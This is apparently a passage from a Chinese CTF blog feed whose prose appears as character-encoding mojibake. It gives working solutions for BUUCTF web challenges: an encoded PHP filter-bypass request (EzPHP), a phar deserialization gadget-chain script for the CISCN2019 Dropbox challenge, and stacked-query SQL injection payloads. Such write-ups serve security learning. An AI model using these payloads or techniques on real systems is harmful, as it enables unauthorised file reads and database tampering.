class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6ePOST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1&#x2F;&#x2F; preg_match() åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209232958132.png" alt="image-20211209232958132"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209221809797.png" alt="image-20211209221809797"></p><p><a href="https://blog.gem-love.com/ctf/770.html">2020BJDCTF â€œEzPHPâ€ +Y1ngCTF â€œY1ngâ€™s Baby Codeâ€ å®˜æ–¹writeup â€“ é¢–å¥‡L&#39;Amore (gem-love.com)</a></p><p>åŸé¢˜ç”¨å¼‚æˆ–ä¹Ÿå¯ä»¥ï¼Œè´´ä¸ªè„šæœ¬å…ˆï¼Œä¸‡ä¸€ä»¥åèƒ½ç”¨åˆ°</p><pre class="language-none"><code class="language-none">#Author: piCEBDC7str_&#x3D; &#39;1flag.php&#39;str_&#x3D;list(str_)final&#x3D;&#39;&#39;for x in str_:    print(hex(~ord(x)&amp;0xff))    final+&#x3D;hex(~ord(x)&amp;0xff)print(str_)final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;)final+&#x3D;&#39;^&#39;for x in range(len(str_)):    final+&#x3D;r&#39;%ff&#39;print(final)</code></pre><p>å–åè„šæœ¬</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x2F;&#x2F;Author: é¢–å¥‡L&#39;Amore&#x2F;&#x2F;Blog: www.gem-love.com$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;$arr1 &#x3D; explode(&#39; &#39;, $a);echo &quot;&lt;br&gt;~(&quot;;foreach ($arr1 as $key &#x3D;&gt; $value) &#123;echo &quot;%&quot;.bin2hex(~$value);&#125;echo &quot;)&lt;br&gt;&quot;;</code></pre><p>ç”¨ç¾½å¸ˆå‚…é‚£ä¸ªä¹Ÿè¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209235444083.png" alt="image-20211209235444083"></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>çŸ¥è¯†ç‚¹ï¼špharçš„ååºåˆ—åŒ–</p><p>ä¼ ä¸ªjpgæ–‡ä»¶ç„¶åä¸‹è½½çš„æ—¶å€™æŠ“åŒ…æœ‰ä¸ªfilenameï¼Œè¿™é‡Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213306758.png" alt="image-20211210213306758"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213358180.png" alt="image-20211210213358180"></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;æ³¨å†ŒæˆåŠŸ&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;è´¦å·æˆ–å¯†ç é”™è¯¯&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;ä¸‹è½½&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;åˆ é™¤&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>pharååºåˆ—åŒ–åˆ©ç”¨æ¡ä»¶ï¼š</p><p>1ï¼‰pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨</p><p>2ï¼‰è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä¸ºè·³æ¿</p><p>3ï¼‰æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</p><p>å¯¹äºæœ¬é¢˜è€Œè¨€ï¼Œç¬¬ä¸€æ¡æ»¡è¶³ï¼Œç¬¬äºŒæ¡æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•__call()å’ŒFileListç±»ã€Userç±»çš„__destruct()ï¼Œææ€•æƒ³ä¸åˆ©ç”¨å®ƒä»¬ä¹Ÿä¸è¡Œï¼Œç¬¬ä¸‰æ¡ååŠéƒ¨åˆ†æ²¡é—®é¢˜ï¼Œå‰åŠéƒ¨åˆ†åˆ™éœ€è¦æˆ‘ä»¬æ‰¾ä¸€æ‰¾ã€‚</p><p>æ—¢æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå°±åº”è¯¥åœ¨æœ¬é¢˜çš„Fileç±»ï¼ˆè‡³å¤šä¹Ÿåœ¨FileListç±»ï¼‰çš„æ–¹æ³•ä¸­å¯»æ‰¾ï¼Œæ¯•ç«Ÿæ•´ä¸ªé¢˜ç›®åŸºæœ¬ä¸Šéƒ½æ˜¯åœ¨é¢å‘å¯¹è±¡çš„åŸºç¡€ä¸Šç¼–ç¨‹ï¼Œå¯¹æ–‡ä»¶çš„æ“ä½œä¹Ÿéƒ½æ˜¯å¯¹Fileç±»çš„å¯¹è±¡çš„æ“ä½œï¼Œ</p><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œopen()æ–¹æ³•è°ƒç”¨äº†file_exists()å’Œis_dir()å‡½æ•°ï¼ˆæ³¨æ„nameæ–¹æ³•é‡Œçš„basenameå‡½æ•°ä¸ç®—ï¼‰ï¼Œsize()æ–¹æ³•è°ƒç”¨äº†filesize()å‡½æ•°ï¼Œdelete()æ–¹æ³•è°ƒç”¨äº†unlink()å‡½æ•°ï¼Œclose()æ–¹æ³•file_get_contents()å‡½æ•°ã€‚</p><p>æœ¬é¢˜è¦è¯»å–/flag.txtæ–‡ä»¶ï¼Œæ•…åˆšåˆšåˆ—ä¸¾çš„è¿™äº›å‡½æ•°ä¸­ï¼Œè™½ç„¶æ–‡ä»¶æ“ä½œå‡½æ•°ä¸å°‘ï¼Œå¯ä»¥ç”¨æ¥è§¦å‘ååºåˆ—åŒ–ï¼Œå¯¹è¯»å–æ–‡ä»¶æœ‰ç”¨çš„åªæœ‰close()æ–¹æ³•ä¸­çš„file_get_contents()å‡½æ•°è¿™ä¸€ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹å®ƒåˆ†æï¼Œ</p><p>è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœæƒ³ä¸åˆ°__call()æ–¹æ³•å’Œ__destruct()æ–¹æ³•ï¼ŒåŸºæœ¬ä¸Šå°±å¯ä»¥æ”¾å¼ƒäº†ï¼Œåœ¨pharé¢˜ç›®é‡Œï¼Œé­”æœ¯æ–¹æ³•ä¸€èˆ¬æ¥è®²æ˜¯å¿…é¡»è¦ç”¨çš„ï¼Œ</p><p>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ï¼ŒFileListçš„__call()æ–¹æ³•è¯­ä¹‰ç®€å•ï¼Œå°±æ˜¯éå†filesæ•°ç»„ï¼Œå¯¹æ¯ä¸€ä¸ªfileå˜é‡æ‰§è¡Œä¸€æ¬¡$funcï¼Œç„¶åå°†ç»“æœå­˜è¿›$resultsæ•°ç»„ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173648992.png" alt="image-20220206173648992"></p><p>æ¥ä¸‹æ¥çš„__destruct__å‡½æ•°ä¼šå°†FileListå¯¹è±¡çš„funcså˜é‡å’Œresultsæ•°ç»„ä¸­çš„å†…å®¹ä»¥HTMLè¡¨æ ¼çš„å½¢å¼è¾“å‡ºåœ¨index.phpä¸Šï¼ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œindex.phpé‡Œåˆ›å»ºäº†ä¸€ä¸ªFileListå¯¹è±¡ï¼Œåœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•åè§¦å‘__destruct__ï¼Œåˆ™ä¼šè¾“å‡ºè¯¥ç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯ï¼‰ï¼Œ</p><p>Userå¯¹è±¡çš„__destruct()æ–¹æ³•ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173602900.png" alt="image-20220206173602900"></p><p>æ— éå°±æ˜¯ è„šæœ¬æ‰§è¡Œå®Œæ¯•åï¼Œæ‰§è¡Œ$dbçš„close()çš„æ–¹æ³•ï¼ˆæ¥å…³é—­æ•°æ®åº“è¿æ¥ï¼‰ï¼Œä½†è¯è¯´å›æ¥ï¼Œæ²¡æœ‰æ‹¬å·é‡Œçš„è¯ï¼Œè¿™å¥è¯ä¾ç„¶æˆç«‹ï¼Œè€Œä¸”è¿™ä¸ª&#39;close&#39;ä¸Fileç±»ä¸­çš„close()æ–¹æ³•åŒåã€‚æ‰€ä»¥ï¼Œå½“dbçš„å€¼ä¸ºä¸€ä¸ªFileListå¯¹è±¡æ—¶ï¼ŒUserå¯¹è±¡ææ„ä¹‹æ—¶ï¼Œä¼šè§¦å‘FileList-&gt;close()ï¼Œä½†FileListé‡Œæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œäºæ˜¯è°ƒç”¨_callå‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œfile_get_contents($filename)ï¼Œè¯»å–äº†æ–‡ä»¶å†…å®¹ã€‚æ•´ä¸ªé“¾çš„ç»“æ„ä¹Ÿå¾ˆç®€å•æ¸…æ™°ï¼šåœ¨æˆ‘ä»¬æ§åˆ¶$dbä¸ºä¸€ä¸ªFileListå¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œ$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()è¾“å‡º$resultã€‚</p><p>ååºåˆ—åŒ–è„šæœ¬</p><pre class="language-none"><code class="language-none">&lt;?php    class User &#123;        public $db;    &#125;     class File&#123;        public $filename;        public function __construct($name)&#123;            $this-&gt;filename&#x3D;$name;        &#125;    &#125;    class FileList &#123;        private $files;        public function __construct()&#123;            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));        &#125;    &#125;     $o &#x3D; new User();    $o-&gt;db &#x3D;new FileList();    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);    $phar-&gt;setMetadata($o);    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);     $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210220146818.png" alt="image-20211210220146818"></p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxä¹‹æ„šè§ - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox_silence1_çš„åšå®¢-CSDNåšå®¢_buuctf ååºåˆ—åŒ–</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlé¢˜wp</title>
      <link href="/2021/06/16/buu-sql%E9%A2%98wp/"/>
      <url>/2021/06/16/buu-sql%E9%A2%98wp/</url>
      
        <content type="html"><![CDATA[<p> sqlå¥½éš¾.jpg</p> <span id="more"></span><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/123/image-20210615120304661.png" alt="image-20210615120304661"></p><p>ç”¨æˆ·æ¡†é‡Œè¾“å…¥å•å¼•å·å‡ºç°æŠ¥é”™ï¼ŒçŒœæµ‹ä¸ºå­—ç¬¦å‹æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/123/image-20210615121140407.png" alt="image-20210615121140407"></p><p>åˆ©ç”¨1&#39;or 1#æ³¨å…¥å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615121210956.png" alt="image-20210615121210956"></p><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>å…ˆè¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615214551313.png" alt="image-20210615214551313"></p><p>åˆ©ç”¨1â€˜ order by å¯ä»¥è¯•å‡ºè¯¥è¡¨ä¸­å­˜åœ¨ä¸¤ä¸ªå­—æ®µ</p><p>æ¥ä¸‹æ¥è¦ç”¨å †å æŸ¥è¯¢ï¼ˆåˆ©ç”¨åˆ†å·æ‰§è¡Œå¤šä¸ªsqlè¯­å¥ï¼‰</p><p>å°è¯•å…ˆæŸ¥è¯¢æ•°æ®åº“</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615214516623.png" alt="image-20210615214516623"></p><p>æˆåŠŸã€‚</p><p>å†æŸ¥è¯¢è¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615214901418.png" alt="image-20210615214901418"></p><p>çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼ŒæŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­çš„å­—æ®µ</p><p>wordsè¡¨å†…å­˜åœ¨ä¸¤ä¸ªå­—æ®µ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615215132406.png" alt="image-20210615215132406"></p><p>1919810931114514è¡¨å†…å­˜åœ¨ä¸€ä¸ªå­—æ®µï¼Œflagåœ¨è¯¥è¡¨å†…ã€‚</p><p>ï¼ˆæŸ¥è¯¢è¯¥è¡¨æ—¶è¡¨åè¦åœ¨åå•å¼•å·å†…ï¼‰</p><p>1&#39;;show columns from <code>1919810931114514</code>#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615215232514.png" alt="image-20210615215232514"></p><p>æ‰€ä»¥å¯ä»¥çŒœæµ‹</p><p>å†…éƒ¨æŸ¥è¯¢è¯­å¥ç±»ä¼¼ : select id, data from words where id =</p><p>æ‰€ä»¥è¦æŠŠwordsè¡¨æ”¹ä¸ºword1ï¼Œå°†flagæ‰€åœ¨çš„è¡¨è¡¨åæ”¹ä¸ºwordsï¼Œç„¶åå°†flagæ”¹åä¸ºidï¼›</p><p>payloadï¼š1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words; alert table words change flag id varchar(100);# </p><p>å†ç”¨1â€™ or 1#æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615232041458.png" alt="image-20210615232041458"></p><p>ä¹Ÿå¯ä»¥æŠŠwordsè¡¨æ”¹ä¸ºwordsï¼Œå°†flagæ‰€åœ¨çš„è¡¨è¡¨åæ”¹ä¸ºwordsï¼Œå†ä¸ºå…¶æ·»åŠ idåˆ—ï¼Œå¹¶å°†flagæ”¹ä¸ºdata</p><p>payloadï¼š1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# </p><p>å†å°†1æäº¤å¯ç›´æ¥è·å¾—flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210615232008605.png" alt="image-20210615232008605"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>è¿›å…¥åè¾“å…¥1æœ‰å›æ˜¾</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617020541195.png" alt="image-20210617020541195"></p><p>è¾“å…¥1â€˜æ— å›æ˜¾çŒœæµ‹æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>ç”¨å †å æ³¨å…¥çš„æ–¹å¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617020708317.png" alt="image-20210617020708317"></p><p>æŸ¥åˆ°å­˜åœ¨ä¸€ä¸ªflagè¡¨ï¼Œå°è¯•æŸ¥çœ‹é‡Œé¢çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617020823449.png" alt="image-20210617020823449"></p><p>å¤§æ¦‚æ˜¯è¢«è¿‡æ»¤äº†ï¼Œåªå¥½ç™¾åº¦æœwpäº†</p><p>çœ‹åˆ°dalaoèƒ½å¤ŸçŒœå‡ºåç«¯è¯­å¥ä¸ºselect &quot;.$</p><p>post[&#39;query&#39;].&quot;||flag from Flag</p><p>ï¼ˆæœåˆ°ä¸€ç¯‡wpè¯´åŸç¯å¢ƒä¸­å­˜åœ¨æºç æ³„éœ²ï¼Œæ‰€ä»¥èƒ½å¤ŸçŸ¥é“è¿™éƒ¨åˆ†çš„sqlè¯­è¨€ï¼Œä½†æ˜¯buuçš„ç¯å¢ƒé‡Œæ²¡æœ‰ <a href="https://blog.csdn.net/weixin_44037296/article/details/105190639?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SUCTF 2019] EasySQL_Senimo-CSDNåšå®¢</a></p><p><strong>è§£æ³•ä¸€</strong>ï¼šè¾“å…¥*,1</p><p>ç”±äº||åœ¨MySQLä¸­èµ·æˆ–çš„ä½œç”¨ï¼Œå› æ­¤1||flagä¼šè¿”å›1ï¼Œä¹Ÿå°±å˜æˆäº†</p><p>select *,1 from Flag.</p><p>æˆåŠŸæ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/sql/image-20210617021123869.png" alt="image-20210617021123869"></p><p>å¦‚æœæŸ¥è¯¢çš„å‚æ•°ä¸å­˜åœ¨ï¼Œé‚£å°±ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„åˆ—ï¼Œå¹¶ä¸”è®¾ç½®è¯¥åˆ—æ‰€æœ‰å‚æ•°éƒ½æ˜¯æŸ¥è¯¢çš„å‚æ•°ã€‚æ‰€ä»¥æ•´ä¸ªpayloadè¯­å¥çš„æ„æ€å°±æ˜¯æŸ¥è¯¢æ‰€æœ‰æ•°æ®ï¼Œç„¶åå¢åŠ 